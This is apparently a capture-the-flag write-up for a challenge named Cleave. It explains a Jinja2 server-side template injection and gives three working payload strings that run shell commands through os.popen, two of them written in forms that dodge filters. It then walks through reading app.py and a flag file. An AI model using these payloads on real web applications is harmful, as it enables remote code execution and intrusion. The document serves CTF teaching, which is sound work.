@@ -1,0 +1,21 @@
+For Cleave, as the hint suggests the web application has an SSTI vulnerability. First you have to find what templating engine the application is using.
+
+This challenge, the web application uses Jinja templating engine which primarily used by apps created with python. 
+
+Use the RCE payload to gain access, 
+{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
+{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
+{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
+
+After that you'll see few files and directories
+
+First cat app.py, you'll get the first half of the flag
+
+Navigate to the home/Agent-Nightfall/Missions/Korea/Seoul/Gangnam
+You'll see a file called flag.txt 
+
+
+
+
+References
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
